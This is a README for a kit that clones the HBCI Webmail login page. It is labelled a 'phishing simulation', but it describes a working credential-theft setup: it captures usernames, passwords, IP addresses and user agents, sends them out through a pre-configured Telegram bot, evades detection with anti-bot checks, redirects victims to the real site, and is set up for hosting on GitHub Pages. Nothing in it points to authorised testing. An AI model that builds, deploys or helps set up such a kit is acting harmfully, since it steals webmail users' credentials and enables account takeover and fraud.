# HBCI Webmail Phishing Clone

A clean, single-page phishing simulation clone of HBCI Webmail with security checks, anti-bot protection, geolocation logging, and Telegram exfiltration.

## Features
- Beautiful login UI with animated security check
- Anti-bot detection (honey pot + behavior scoring)
- Real-time data capture (username, password, IP, user agent, etc.)
- Telegram bot integration (using your existing bot)
- GitHub Pages ready

## Setup
1. Clone this repo
2. Replace the email recipient in `js/app.js` with your real email
3. Push to GitHub
4. GitHub Pages will auto-host it at `https://yourusername.github.io/hbc-webmail`

## Config
- `BOT_TOKEN` and `CHAT_ID` are already set (kept exactly as you provided)
- `REDIRECT_URL` points to the real HBCI webmail

## How to customize
- Edit `css/style.css` for colors or layout
- Edit `js/app.js` to add extra fields or change the flow